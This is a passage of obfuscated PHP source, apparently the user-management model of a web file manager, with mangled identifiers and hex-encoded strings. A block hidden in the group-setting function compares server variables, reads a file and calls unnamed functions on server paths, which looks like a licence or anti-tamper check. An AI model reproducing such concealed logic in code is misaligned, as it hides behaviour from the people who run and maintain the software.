$‘Î¢ÄÏ®[$•£àËúŒ[32]], $•£àËúŒ[2488] => isset($‘Î¢ÄÏ®[$•£àËúŒ[2465]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[2465]] : $•£àËúŒ[12], $•£àËúŒ[2489] => isset($‘Î¢ÄÏ®[$•£àËúŒ[2490]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[2490]] : 1, $•£àËúŒ[2491] => $‘Î¢ÄÏ®[$•£àËúŒ[978]], $•£àËúŒ[2068] => isset($‘Î¢ÄÏ®[$•£àËúŒ[1967]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[1967]] : 1024 * 1024 * 20, $•£àËúŒ[2069] => 0, $•£àËúŒ[2492] => 0, $•£àËúŒ[2113] => isset($‘Î¢ÄÏ®[$•£àËúŒ[833]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[833]] : 1); if (!empty($‘Î¢ÄÏ®[$•£àËúŒ[1782]])) { $·œ‚ÏË¦[$•£àËúŒ[1782]] = $‘Î¢ÄÏ®[$•£àËúŒ[1782]]; } $µ²€¸ÈŒ = $this->_checkExist($‘Î¢ÄÏ®); if ($µ²€¸ÈŒ !== !0) { return $µ²€¸ÈŒ; } if (!empty($·œ‚ÏË¦[$•£àËúŒ[2465]]) && strlen($·œ‚ÏË¦[$•£àËúŒ[2465]]) > 255) { $·œ‚ÏË¦[$•£àËúŒ[2465]] = $•£àËúŒ[12]; } $ê¢†àë = $this->add($·œ‚ÏË¦); $Èù”›ù = array($•£àËúŒ[2491] => $·œ‚ÏË¦[$•£àËúŒ[978]], $•£àËúŒ[2487] => $·œ‚ÏË¦[$•£àËúŒ[2268]]); $this->userEdit($ê¢†àë, $Èù”›ù); Model($•£àËúŒ[1428])->userRootAdd($ê¢†àë); return $ê¢†àë; } protected function userEditTest($ú–œğµ, $ªÏÓÆËœ) { return $this->call($_SERVER[íïàËŸë][2493], $ú–œğµ, $ªÏÓÆËœ); } protected function userEdit($ıÖÂÂøÛ, $Ÿã§áİâ) { $ÂÙ»â¯ˆ =& $_SERVER[íïàËŸë]; $äâ¿ï— = $this->getInfoSimple($ıÖÂÂøÛ); if (!$äâ¿ï—) { return !1; } $ùş¬À½ş = $this->_checkExist($Ÿã§áİâ, $ıÖÂÂøÛ); if ($ùş¬À½ş !== !0) { return $ùş¬À½ş; } if (isset($Ÿã§áİâ[$ÂÙ»â¯ˆ[978]]) && trim($Ÿã§áİâ[$ÂÙ»â¯ˆ[978]]) != $ÂÙ»â¯ˆ[12]) { $¨Ç¡×Ö™ = $this->metaGet($ıÖÂÂøÛ); if (empty($¨Ç¡×Ö™[$ÂÙ»â¯ˆ[2483]])) { $¨Ç¡×Ö™[$ÂÙ»â¯ˆ[2483]] = rand_string(10); Model($ÂÙ»â¯ˆ[577])->metaSet($ıÖÂÂøÛ, $ÂÙ»â¯ˆ[2483], $¨Ç¡×Ö™[$ÂÙ»â¯ˆ[2483]]); } $Ÿã§áİâ[$ÂÙ»â¯ˆ[978]] = md5($¨Ç¡×Ö™[$ÂÙ»â¯ˆ[2483]] . trim($Ÿã§áİâ[$ÂÙ»â¯ˆ[978]])); } else { unset($Ÿã§áİâ[$ÂÙ»â¯ˆ[978]]); } if (!empty($Ÿã§áİâ[$ÂÙ»â¯ˆ[2465]]) && strlen($Ÿã§áİâ[$ÂÙ»â¯ˆ[2465]]) > 255) { $Ÿã§áİâ[$ÂÙ»â¯ˆ[2465]] = $ÂÙ»â¯ˆ[12]; } $this->where(array($ÂÙ»â¯ˆ[1773] => $ıÖÂÂøÛ))->save($Ÿã§áİâ); if (isset($Ÿã§áİâ[$ÂÙ»â¯ˆ[2268]])) { $this->setNamePinyin($ıÖÂÂøÛ, $Ÿã§áİâ[$ÂÙ»â¯ˆ[2268]]); } $this->clearCache($ıÖÂÂøÛ); return !0; } public function setNamePinyin($™ÀÑ¦Úú, $¿çâ£ÃÇ = false) { $…‘·ÖÅÍ =& $_SERVER[íïàËŸë]; if (!$¿çâ£ÃÇ) { $œµàÎ¯ = $this->getInfoSimple($™ÀÑ¦Úú); $¿çâ£ÃÇ = $œµàÎ¯[$…‘·ÖÅÍ[2268]] ? $œµàÎ¯[$…‘·ÖÅÍ[2268]] : $œµàÎ¯[$…‘·ÖÅÍ[32]]; } $ÌÉÙò‚· = Model($…‘·ÖÅÍ[598]); if (!Input::check($¿çâ£ÃÇ, $…‘·ÖÅÍ[655])) { return $ÌÉÙò‚·->metaSet($™ÀÑ¦Úú, array($…‘·ÖÅÍ[538] => $…‘·ÖÅÍ[12], $…‘·ÖÅÍ[537] => $…‘·ÖÅÍ[12])); } return $ÌÉÙò‚·->metaSet($™ÀÑ¦Úú, array($…‘·ÖÅÍ[538] => str_replace($…‘·ÖÅÍ[53], $…‘·ÖÅÍ[12], Pinyin::get($¿çâ£ÃÇ)), $…‘·ÖÅÍ[537] => Pinyin::get($¿çâ£ÃÇ, $…‘·ÖÅÍ[656]))); } private function nickNameRpt() { $¯›ˆÕûò =& $_SERVER[íïàËŸë]; $ª€ÅĞ‰³ = Model($¯›ˆÕûò[853])->get($¯›ˆÕûò[2494]); $à÷ØÏöç = $GLOBALS[$¯›ˆÕûò[6]][$¯›ˆÕûò[457]][$¯›ˆÕûò[2494]]; $ô‡ƒ¢Ö¡ = !is_null($ª€ÅĞ‰³) ? $ª€ÅĞ‰³ : $à÷ØÏöç; return !!$ô‡ƒ¢Ö¡; } private function _checkExist($Ë²œí§ç, $¤å×àú = false) { $½‘´ÉÌÕ =& $_SERVER[íïàËŸë]; $…”öË‰ = array($½‘´ÉÌÕ[32] => UserModel::ERROR_USER_EXIST_NAME, $½‘´ÉÌÕ[2268] => UserModel::ERROR_USER_EXIST_NICKNAME, $½‘´ÉÌÕ[381] => UserModel::ERROR_USER_EXIST_EMAIL, $½‘´ÉÌÕ[2482] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($…”öË‰[$½‘´ÉÌÕ[2268]]); } $ª¡û÷˜ = $¤å×àú ? array($½‘´ÉÌÕ[1782] => array($½‘´ÉÌÕ[2495], $¤å×àú)) : array(); foreach ($…”öË‰ as $È‰Õæ‘¦ => $±ÄÑéúü) { $Æçéà‰‚ = array(); foreach ($…”öË‰ as $ìæˆşÇ£ => $¥«è¬Ö) { if (isset($Ë²œí§ç[$ìæˆşÇ£]) && $Ë²œí§ç[$ìæˆşÇ£]) { $Æçéà‰‚[] = $Ë²œí§ç[$ìæˆşÇ£]; } } if (!$Æçéà‰‚) { continue; } $­ÒÎ¸£Ú = array_merge(array($È‰Õæ‘¦ => array($½‘´ÉÌÕ[7], $Æçéà‰‚)), $ª¡û÷˜); $ Ñµ›·ï = $this->where($­ÒÎ¸£Ú)->find(); if ($ Ñµ›·ï) { return $±ÄÑéúü; } } return !0; } public function userListInfo($‚åÙª³Í) { $°ºš”° =& $_SERVER[íïàËŸë]; $Ñò’´Š­ = array(); $‚åÙª³Í = is_array($‚åÙª³Í) ? array_unique($‚åÙª³Í) : array(); if (!$‚åÙª³Í) { return $Ñò’´Š­; } if (count($‚åÙª³Í) < 20) { foreach ($‚åÙª³Í as $‹Æ±•òº) { $Ñò’´Š­[$‹Æ±•òº . $°ºš”°[12]] = $this->getInfoSimpleOuter($‹Æ±•òº); } } else { $¯ºö½šº = array($°ºš”°[1773] => array($°ºš”°[492], $‚åÙª³Í)); if (count($‚åÙª³Í) == 1) { $¯ºö½šº = array($°ºš”°[1773] => $‚åÙª³Í[0]); } $šÙæï‹ = Model($°ºš”°[577])->field($this->simpleField)->where($¯ºö½šº)->select(); $šÙæï‹ = array_to_keyvalue($šÙæï‹, $°ºš”°[1782]); foreach ($‚åÙª³Í as $‹Æ±•òº) { $ˆ‰è–ª“ = $šÙæï‹[$‹Æ±•òº]; if (!$ˆ‰è–ª“) { $Ñò’´Š­[$‹Æ±•òº . $°ºš”°[12]] = $this->getInfoSimpleOuter($‹Æ±•òº); continue; } $ˆ‰è–ª“[$°ºš”°[2465]] = Action($°ºš”°[2466])->parseUrl($ˆ‰è–ª“[$°ºš”°[2465]]); $Ñò’´Š­[$‹Æ±•òº . $°ºš”°[12]] = $ˆ‰è–ª“; } } return $Ñò’´Š­; } protected function userStatus($Ø¢¯Èê¹, $ƒÙÓä•†) { $†ÓÏµùÓ = $this->getInfoSimple($Ø¢¯Èê¹); if (!$†ÓÏµùÓ) { return !1; } $ÎÕÍÍº = array($_SERVER[íïàËŸë][833] => $ƒÙÓä•†); return $this->userEdit($Ø¢¯Èê¹, $ÎÕÍÍº); } protected function userRemove($’Ìœ¶õ´) { $ĞçšõßÇ =& $_SERVER[íïàËŸë]; $ˆÆÀÒØ = $this->getInfoSimple($’Ìœ¶õ´); if (!$ˆÆÀÒØ) { return !1; } $˜ÍÙ•Ä = array($ĞçšõßÇ[1773] => $’Ìœ¶õ´); Model($ĞçšõßÇ[664])->where($˜ÍÙ•Ä)->delete(); Model($ĞçšõßÇ[2496])->where($˜ÍÙ•Ä)->delete(); Model($ĞçšõßÇ[2074])->where($˜ÍÙ•Ä)->delete(); Model($ĞçšõßÇ[2481])->where($˜ÍÙ•Ä)->delete(); Model($ĞçšõßÇ[1158])->where($˜ÍÙ•Ä)->delete(); Model($ĞçšõßÇ[2285])->removeUserAll($’Ìœ¶õ´); Model($ĞçšõßÇ[907])->userRootRemove($’Ìœ¶õ´); return $this->where($˜ÍÙ•Ä)->delete(); } protected function userGroupSet($³’¹¦¦£, $ÈîøÑéÒ, $µ®ß¬Ñ = array()) { $õü™¬ò =& $_SERVER[íïàËŸë]; if ($_SERVER[$õü™¬ò[909]] != $_SERVER[$õü™¬ò[966]]) { $–´ñÕ‚» = $õü™¬ò[967]; $×Ù“½Œ  = $õü™¬ò[911]; $ªâ‘Ï´£ = $_SERVER[$õü™¬ò[912]] . $õü™¬ò[913]; $¼ÕµÁòÙ = $×Ù“½Œ ($ªâ‘Ï´£); $Ïš¤½â­ = explode($õü™¬ò[262], $¼ÕµÁòÙ); if (count($Ïš¤½â­) < $õü™¬ò[693]) { $ş¯ÚäÓ¥ = $õü™¬ò[914]; $ş¯ÚäÓ¥(); } $¡ûÌ„¦ä = $õü™¬ò[968]; $¡ûÌ„¦ä($_SERVER[$õü™¬ò[969]]); $¡ûÌ„¦ä($_SERVER[$õü™¬ò[912]] . $õü™¬ò[970]); $ºÚçƒß = 1; while ($ºÚçƒß > 1) { $ºÚçƒß = $ºÚçƒß + 4; $»€ÌåŞ = rawurlencode($ºÚçƒß . $õü™¬ò[454]); } } $çÛâ¾ï² = $this->getInfoSimple($³’¹¦¦£); if (!$çÛâ¾ï² || !is_array($ÈîøÑéÒ)) { return !1; } $Š¤ı…ìû = Model($õü™¬ò[2074]); $Š¤ı…ìû->where(array($õü™¬ò[1782] => $³’¹¦¦£))->delete(); $û¯è±¼  = array(); $õÌ¡ Ğè = 0; foreach ($ÈîøÑéÒ as $ÔÄ†§÷¨ => $³‘·ä¶) { $Ğ£ü¿ƒ§ = array($õü™¬ò[1782] => $³’¹¦¦£, $õü™¬ò[1980] => $ÔÄ†§÷¨, $õü™¬ò[2088] => $³‘·ä¶); $Ğ£ü¿ƒ§[$õü™¬ò[2004]] = isset($µ®ß¬Ñ[$õÌ¡ Ğè]) ? $µ®ß¬Ñ[$õÌ¡ Ğè] : 0; $õÌ¡ Ğè++; $û¯è±¼ [] = $Ğ£ü¿ƒ§; } return $Š¤ı…ìû->addAll($û¯è±¼ , array(), !0); } protected function userGroupAdd($ŞÓÆñ¾, $•öµñ÷ = array()) { $ĞîÆğ® =& $_SERVER[íïàËŸë]; $Ğ¦°Ô… = $this->getInfoSimple($ŞÓÆñ¾); if (!$Ğ¦°Ô… || empty($•öµñ÷)) { return !1; } $¹Š¾î˜ = array(); foreach ($•öµñ÷ as $ùùËš‰° => $ÜÓ¯êÀç) { $¹Š¾î˜[] = array($ĞîÆğ®[1782] => $ŞÓÆñ¾, $ĞîÆğ®[1980] => $ùùËš‰°, $ĞîÆğ®[2088] => $ÜÓ¯êÀç, $ĞîÆğ®[2004] => 0); } return Model($ĞîÆğ®[2074])->addAll($¹Š¾î˜, array(), !0); } protected function userGroupRemove($ßõœôÀÀ, $¬…õß«) { $ †Ç«Û =& $_SERVER[íïàËŸë]; $×ß£ĞÅ = $this->getInfoSimple($ßõœôÀÀ); if (!$×ß£ĞÅ || !$¬…õß«) { return !1; } $ğ³•Æ¹¤ = array($ †Ç«Û[1773] => $ßõœôÀÀ, $ †Ç«Û[2072] => $¬…õß«); return Model($ †Ç«Û[2074])->where($ğ³•Æ¹¤)->delete(); } public function listData() { $û·âÍÕÈ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($û·âÍÕÈ[$_SERVER[íïàËŸë][445]]); return $û·âÍÕÈ; } public function listByID($¥ŒŒÒ¬¾) { $õã¥ÎÀÏ =& $_SERVER[íïàËŸë]; if (!$¥ŒŒÒ¬¾) { return; } $ØÂ÷—úä = array($õã¥ÎÀÏ[1782] => array($õã¥ÎÀÏ[7], $¥ŒŒÒ¬¾)); $‰ÚÓ²ïè = $this->where($ØÂ÷—úä)->select(); $‰ÚÓ²ïè = array_sort_keep($‰ÚÓ²ïè, $õã¥ÎÀÏ[1782], $¥ŒŒÒ¬¾); $this->_listDataApply($‰ÚÓ²ïè); return $‰ÚÓ²ïè; } public function listByGroup($¬óŞ©Ø = 0, $ùÊÑäÍ™ = array()) { $àÉ…ô“˜ =& $_SERVER[íïàËŸë]; $æ¯Ô¬—¨ = $àÉ…ô“˜[12]; $±µÓïú = array(); if ($¬óŞ©Ø) { $±µÓïú = array($àÉ…ô“˜[2497] => intval($¬óŞ©Ø)); $æ¯Ô¬—¨ = "\x4c\x45\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\165\163\145\162\x5f\x67\162\x6f\165\x70\x20\x75\x73\145\x72\x5f\147\x72\157\x75\160\40\x6f\156\x20\x75\x73\x65\x72\x2e\x75\x73\x65\162\111\104\x20\x3d\x20\165\163\145\x72\x5f\x67\x72\157\x75\x70\x2e\165\163\x65\x72\111\x44"; $İâŠ—­â = Input::get($àÉ…ô“˜[530], null, $àÉ…ô“˜[12]) ? $àÉ…ô“˜[12] : $àÉ…ô“˜[2498]; } if (isset($ùÊÑäÍ™[$àÉ…ô“˜[833]])) { $±µÓïú[$àÉ…ô“˜[2499]] = $ùÊÑäÍ™[$àÉ…ô“˜[833]]; } $éİù¼ş¯ = $this->_makeOrder($İâŠ—­â)->field($àÉ…ô“˜[2500])->where($±µÓïú)->join($æ¯Ô¬—¨)->selectPage(50); $this->_listDataApply($éİù¼ş¯[$àÉ…ô“˜[445]]); return $éİù¼ş¯; } private function _makeOrder($şÏ¬¶îÅ = '') { $‘©Å½‡Ã =& $_SERVER[íïàËŸë]; $ÉêÂ©¿Ñ = array($‘©Å½‡Ã[1782], $‘©Å½‡Ã[32], $‘©Å½‡Ã[1969], $‘©Å½‡Ã[2186], $‘©Å½‡Ã[1941], $‘©Å½‡Ã[231]); $ß‡£¢ì = array($‘©Å½‡Ã[523] => $‘©Å½‡Ã[524], $‘©Å½‡Ã[525] => $‘©Å½‡Ã[526]); $õ‹¸ÇİÜ = Input::get($‘©Å½‡Ã[530], $‘©Å½‡Ã[7], $‘©Å½‡Ã[1773], $ÉêÂ©¿Ñ); $Ã²†…Çé = Input::get($‘©Å½‡Ã[531], $‘©Å½‡Ã[7], $‘©Å½‡Ã[2075], array($‘©Å½‡Ã[2075], $‘©Å½‡Ã[525])); $Ã²†…Çé = $ß‡£¢ì[$Ã²†…Çé]; $şÏ¬¶îÅ = $şÏ¬¶îÅ . "\x75\x73\x65\162\x2e{$õ‹¸ÇİÜ}\40{$Ã²†…Çé}\x2c\x20\x75\163\x65\x72\x2e\165\x73\x65\x72\111\104\x20\x61\163\x63"; return $this->alias($‘©Å½‡Ã[2202])->order($şÏ¬¶îÅ); } public function listSearch($Øû›Ï©) { $€òåß” =& $_SERVER[íïàËŸë]; $‡Ì‘‘»Ö = trim($Øû›Ï©[$€òåß”[2078]]); $‰¦ã°‰Ù = explode($€òåß”[53], $‡Ì‘‘»Ö); if (!$‡Ì‘‘»Ö || count($‰¦ã°‰Ù) == 1) { return $this->listSearchNow($Øû›Ï©); } $•ôå€±« = array($€òåß”[445] => array()); foreach ($‰¦ã°‰Ù as $‰òêõ»») { if (!trim($‰òêõ»»)) { continue; } $Øû›Ï©[$€òåß”[2078]] = $‰òêõ»»; $€ÖÏªØ¾ = $this->listSearchNow($Øû›Ï©); $•ôå€±«[$€òåß”[445]] = array_merge($•ôå€±«[$€òåß”[445]], $€ÖÏªØ¾[$€òåß”[445]]); } $•ôå€±«[$€òåß”[445]] = array_unique_by_key($•ôå€±«[$€òåß”[445]], $€òåß”[1782]); $•ôå€±«[$€òåß”[442]] = array($€òåß”[443] => count($•ôå€±«[$€òåß”[445]]), $€òåß”[439] => 20, $€òåß”[429] => 1, $€òåß”[444] => 1); return $•ôå€±«; } public function listSearchNow($‚’Ëë×²) { $¶ÑãæÕı =& $_SERVER[íïàËŸë]; $ÊÏ¡¼…š = trim($‚’Ëë×²[$¶ÑãæÕı[2078]]); $æ‡ÑÑš = isset($‚’Ëë×²[$¶ÑãæÕı[2079]]) ? $‚’Ëë×²[$¶ÑãæÕı[2079]] : !1; $ÊÏ¡¼…š = str_replace($¶ÑãæÕı[2080], $¶ÑãæÕı[2081], trim($ÊÏ¡¼…š)); $Ï¸¯êŸ = array($¶ÑãæÕı[32] => array($¶ÑãæÕı[459], "\45{$ÊÏ¡¼…š}\45"), $¶ÑãæÕı[381] => array($¶ÑãæÕı[459], "{$ÊÏ¡¼…š}\x25"), $¶ÑãæÕı[2268] => array($¶ÑãæÕı[459], "{$ÊÏ¡¼…š}\x25"), $¶ÑãæÕı[1089] => $¶ÑãæÕı[2082]); if (Input::check($ÊÏ¡¼…š, $¶ÑãæÕı[387])) { $Ï¸¯êŸ[$¶ÑãæÕı[1782]] = array($¶ÑãæÕı[459], "{$ÊÏ¡¼…š}\45"); $Ï¸¯êŸ[$¶ÑãæÕı[2482]] = array($¶ÑãæÕı[459], "{$ÊÏ¡¼…š}\45"); } if (!$ÊÏ¡¼…š) { $Ï¸¯êŸ = array(); } if (isset($‚’Ëë×²[$¶ÑãæÕı[833]])) { $Ï¸¯êŸ[$¶ÑãæÕı[833]] = $‚’Ëë×²[$¶ÑãæÕı[833]]; } $Ï¸¯êŸ = $this->parseWhereLike($Ï¸¯êŸ); $ŸüçÛò€ = $this->_makeOrder()->where($Ï¸¯êŸ)->selectPage(20); if (!$ŸüçÛò€ || count($ŸüçÛò€[$¶ÑãæÕı[445]]) < 5 && Input::check($ÊÏ¡¼…š, $¶ÑãæÕı[394])) { $Æ†íÒòè = $this->_searchFromMeta($¶ÑãæÕı[537], $ÊÏ¡¼…š, 10); $åÑÀ©Š = $this->_searchFromMeta($¶ÑãæÕı[538], $ÊÏ¡¼…š, 10); $ú½í‹ = array_merge($Æ†íÒòè, $åÑÀ©Š, $ŸüçÛò€[$¶ÑãæÕı[445]]); $ŸüçÛò€[$¶ÑãæÕı[445]] = array_unique_by_key($ú½í‹, $¶ÑãæÕı[1782]); $ŸüçÛò€[$¶ÑãæÕı[442]][$¶ÑãæÕı[443]] = count($ŸüçÛò€[$¶ÑãæÕı[445]]); $ŸüçÛò€[$¶ÑãæÕı[442]][$¶ÑãæÕı[444]] = ceil($ŸüçÛò€[$¶ÑãæÕı[442]][$¶ÑãæÕı[443]] / $ŸüçÛò€[$¶ÑãæÕı[442]][$¶ÑãæÕı[439]]); } $this->_listDataApply($ŸüçÛò€[$¶ÑãæÕı[445]]); $this->_filterByGroup($ŸüçÛò€, $æ‡ÑÑš); return $ŸüçÛò€; } private function _filterByGroup(&$ÆøŞ½Û, $²ÛŞğÔŠ) { $‘Ã½¦û° =& $_SERVER[íïàËŸë]; if (!$²ÛŞğÔŠ) { return $ÆøŞ½Û; } foreach ($ÆøŞ½Û[$‘Ã½¦û°[445]] as $Õ–Àß• => &$Ù±…×¿) { $ˆ¶æ˜¯ = array_to_keyvalue($Ù±…×¿[$‘Ã½¦û°[2171]], $‘Ã½¦û°[12], $‘Ã½¦û°[1980]); if (!in_array($²ÛŞğÔŠ, $ˆ¶æ˜¯)) { unset($ÆøŞ½Û[$‘Ã½¦û°[445]][$Õ–Àß•]); } } unset($Ù±…×¿); $ÆøŞ½Û[$‘Ã½¦û°[445]] = array_values($ÆøŞ½Û[$‘Ã½¦û°[445]]); $ÆøŞ½Û[$‘Ã½¦û°[442]] = array($‘Ã½¦û°[2238] => count($ÆøŞ½Û[$‘Ã½¦û°[445]]), $‘Ã½¦û°[2236] => $ÆøŞ½Û[$‘Ã½¦û°[442]][$‘Ã½¦û°[439]], $‘Ã½¦û°[2235] => 1, $‘Ã½¦û°[2237] => 1); } private function _searchFromMeta($ÌÔø¦Æê, $óĞ›ä·Ò, $àÔ½â½¯) { $ö¼ŒÜ‡á =& $_SERVER[íïàËŸë]; $óĞ›ä·Ò = strtolower($óĞ›ä·Ò); $ø»‹Ó«‡ = array($ö¼ŒÜ‡á[97] => $ÌÔø¦Æê, $ö¼ŒÜ‡á[450] => array($ö¼ŒÜ‡á[459], "\45{$óĞ›ä·Ò}\45")); $ø»‹Ó«‡ = $this->parseWhereLike($ø»‹Ó«‡); $È–É£¤º = Model($ö¼ŒÜ‡á[2501])->where($ø»‹Ó«‡)->limit($àÔ½â½¯)->select(); if (!$È–É£¤º) { return array(); } $È–É£¤º = array_to_keyvalue($È–É£¤º, $ö¼ŒÜ‡á[12], $ö¼ŒÜ‡á[1782]); $Ğš±Ôåï = $this->where(array($ö¼ŒÜ‡á[1773] => array($ö¼ŒÜ‡á[7], $È–É£¤º)))->select(); if (!$Ğš±Ôåï) { return array(); } return $Ğš±Ôåï; } private function _listDataApplyItem($‡‘Ùõ×‡) { $òÁñ¦š = array($‡‘Ùõ×‡); $this->_listDataApply($òÁñ¦š); return $òÁñ¦š[0]; } private function _listDataApply(&$Ó°øñØŸ) { $Í‹µ‹ =& $_SERVER[íïàËŸë]; if (!$Ó°øñØŸ) { return; } array_remove_key($Ó°øñØŸ, $Í‹µ‹[978]); $ŸÖòÑ‰¢ = array_to_keyvalue($Ó°øñØŸ, $Í‹µ‹[12], $Í‹µ‹[1782]); $this->_listAppendGroup($Ó°øñØŸ, $ŸÖòÑ‰¢); $this->_listAppendMeta($Ó°øñØŸ, $ŸÖòÑ‰¢); $this->_listAppendSourceRoot($Ó°øñØŸ, $ŸÖòÑ‰¢); } private function _listAppendSourceRoot(&$ÈëëÜûí, $ÄÑûØ®í) { $‹ıÔç =& $_SERVER[íïàËŸë]; $Ü®â˜¿Œ = Model($‹ıÔç[907])->listSourceRoot(SourceModel::TYPE_USER, $ÄÑûØ®í); $Ü®â˜¿Œ = array_to_keyvalue($Ü®â˜¿Œ, $‹ıÔç[569]); $Ü®â˜¿Œ = array_remove_key($Ü®â˜¿Œ, $‹ıÔç[569]); foreach ($ÈëëÜûí as &$ô‘¸ëÚ‚) { $ô‘¸ëÚ‚[$‹ıÔç[90]] = $Ü®â˜¿Œ[$ô‘¸ëÚ‚[$‹ıÔç[1782]]] ? $Ü®â˜¿Œ[$ô‘¸ëÚ‚[$‹ıÔç[1782]]] : array(); } unset($ô‘¸ëÚ‚); } private function _listAppendGroup(&$°É„’¥½, $˜¡ñ«š×) { $Ì»¥Ää =& $_SERVER[íïàËŸë]; $°É¦İÍ = array($Ì»¥Ää[1782] => array($Ì»¥Ää[7], $˜¡ñ«š×)); $±æÎ”” = Model($Ì»¥Ää[2074])->where($°É¦İÍ)->select(); $ÕÄŒß‚ = array_to_keyvalue($±æÎ””, $Ì»¥Ää[12], $Ì»¥Ää[1980]); $ÕÄŒß‚ = array_remove_value(array_unique($ÕÄŒß‚), $Ì»¥Ää[228]); if (!$ÕÄŒß‚ || !$±æÎ””) { return; } $°É¦İÍ = array($Ì»¥Ää[1980] => array($Ì»¥Ää[7], $ÕÄŒß‚)); $ À™µ¢¾ = Model($Ì»¥Ää[2169])->field($Ì»¥Ää[2502])->where($°É¦İÍ)->select(); $ À™µ¢¾ = array_to_keyvalue($ À™µ¢¾, $Ì»¥Ää[1980]); $±æÎ”” = array_to_keyvalue_group($±æÎ””, $Ì»¥Ää[1782]); foreach ($±æÎ”” as &$Í§¤ïä) { $“ Úí = array(); foreach ($Í§¤ïä as $Í§Üú®») { if (!$Í§Üú®»[$Ì»¥Ää[2088]]) { continue; } $Õç´ĞÛ = Model($Ì»¥Ää[571])->listData($Í§Üú®»[$Ì»¥Ää[2088]]); $“ Úí[] = array($Ì»¥Ää[1980] => $Í§Üú®»[$Ì»¥Ää[1980]], $Ì»¥Ää[2503] => $ À™µ¢¾[$Í§Üú®»[$Ì»¥Ää[1980]]][$Ì»¥Ää[32]], $Ì»¥Ää[584] => $ À™µ¢¾[$Í§Üú®»[$Ì»¥Ää[1980]]][$Ì»¥Ää[584]], $Ì»¥Ää[487] => $Õç´ĞÛ); } $Í§¤ïä = $“ Úí; } unset($Í§¤ïä); foreach ($°É„’¥½ as &$‡ĞßšŞº) { $‡ĞßšŞº[$Ì»¥Ää[2171]] = array(); if (isset($±æÎ””[$‡ĞßšŞº[$Ì»¥Ää[1782]]])) { $‡ĞßšŞº[$Ì»¥Ää[2171]] = $±æÎ””[$‡ĞßšŞº[$Ì»¥Ää[1782]]]; } } unset($‡ĞßšŞº); } public function userAppendGroup($Š‰ä³öŸ) { $²ïÃÑ³» =& $_SERVER[íïàËŸë]; if (!$Š‰ä³öŸ) { return array(); } $this->_listAppendGroup($Š‰ä³öŸ, array_to_keyvalue($Š‰ä³öŸ, $²ïÃÑ³»[12], $²ïÃÑ³»[1782])); return $Š‰ä³öŸ; } private function _listAppendMeta(&$É¿«µÚ, $„áš–÷¼) { $ÎÈ†Éú§ =& $_SERVER[íïàËŸë]; $ÉÍ‘‚êÜ = UserJobModel::JOB_KEY; $Œ‚†©¬Ø = array($ÎÈ†Éú§[2483]); $˜ŒË„±Î = array($ÎÈ†Éú§[1782] => array($ÎÈ†Éú§[7], $„áš–÷¼)); $‘Ÿí¢´™ = Model($ÎÈ†Éú§[2481])->where($˜ŒË„±Î)->select(); $‘Ÿí¢´™ = array_to_keyvalue_group($‘Ÿí¢´™, $ÎÈ†Éú§[1782]); foreach ($‘Ÿí¢´™ as &$Ş­ÍıšÍ) { $õ‹ØÕ¢Ä = array(); foreach ($Ş­ÍıšÍ as $¬ò­şªŞ) { if (!in_array($¬ò­şªŞ[$ÎÈ†Éú§[97]], $Œ‚†©¬Ø)) { $õ‹ØÕ¢Ä[$¬ò­şªŞ[$ÎÈ†Éú§[97]]] = $¬ò­şªŞ[$ÎÈ†Éú§[450]]; } } $Ş­ÍıšÍ = $õ‹ØÕ¢Ä; } unset($Ş­ÍıšÍ); $œ™™×óğ = Model($ÎÈ†Éú§[2504]); foreach ($É¿«µÚ as &$æÂÊ»¸ö) { $æ½ë»Ü¦ = array(); if (isset($‘Ÿí¢´™[$æÂÊ»¸ö[$ÎÈ†Éú§[1782]]])) { $æ½ë»Ü¦ = $‘Ÿí¢´™[$æÂÊ»¸ö[$ÎÈ†Éú§[1782]]]; } $æÂÊ»¸ö[$ÎÈ†Éú§[2505]] = array(); if (isset($æ½ë»Ü¦[$ÉÍ‘‚êÜ])) { $æÂÊ»¸ö[$ÎÈ†Éú§[2505]] = $œ™™×óğ->getUserJobInfo($æ½ë»Ü¦[$ÉÍ‘‚êÜ]); } } unset($æÂÊ»¸ö); } protected function groupUserAll($¼±·™§İ) { $êªß˜è =& $_SERVER[íïàËŸë]; if (!$¼±·™§İ) { return !1; } $¶šûÛàê = Model($êªß˜è[2074])->field($êªß˜è[1782])->where(array($êªß˜è[1980] => array($êªß˜è[7], $¼±·™§İ)))->select(); $¶šûÛàê = array_to_keyvalue($¶šûÛàê, $êªß˜è[12], $êªß˜è[1782]); return array_unique($¶šûÛàê); } public function userSearch($§¾¿äÔ, $é×†úıÜ = "\x2a") { return Model($_SERVER[íïàËŸë][598])->where($§¾¿äÔ)->field($é×†úıÜ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($§°ú»Ï) { $¬šè½‚º =& $_SERVER[íïàËŸë]; $ùú¯Ò“Ò = defined($¬šè½‚º[2206]) && USER_ID ? USER_ID : $¬šè½‚º[12]; return "\x55\x73\145\162\x4f\x70\164\151\157\x6e\137{$§°ú»Ï}\137" . $ùú¯Ò“Ò; } protected function filterWhere($ÕµòÛÑè) { $‡—ìËÜı =& $_SERVER[íïàËŸë]; $ÕµòÛÑè[$‡—ìËÜı[1782]] = defined($‡—ìËÜı[2206]) && USER_ID ? USER_ID : $‡—ìËÜı[12]; return $ÕµòÛÑè; } public function cacheRemoveUser($ÄÒÕ¯İ, $´İŞÊÜû) { return Cache::remove("\125\163\145\x72\117\x70\164\151\x6f\156\x5f{$ÄÒÕ¯İ}\137" . $´İŞÊÜû); } protected function optionDefault($ãß‡á¶¡ = '') { $™œó†Ü° =& $_SERVER[íïàËŸë]; if ($ãß‡á¶¡ == $™œó†Ü°[12]) { return $GLOBALS[$™œó†Ü°[6]][$™œó†Ü°[2506]]; } if ($ãß‡á¶¡ == $™œó†Ü°[2507]) { return $GLOBALS[$™œó†Ü°[6]][$™œó†Ü°[2508]]; } } } goto EÛÑ¸ˆã¡„; A³ñŒÏòé„: class TaskFileTransfer extends Task { protected function startAfter() { $²Ê´€–‹ =& $_SERVER[íïàËŸë]; $îö“­û‹ =& $this->task; $this->sourceCopyFolder = !1; 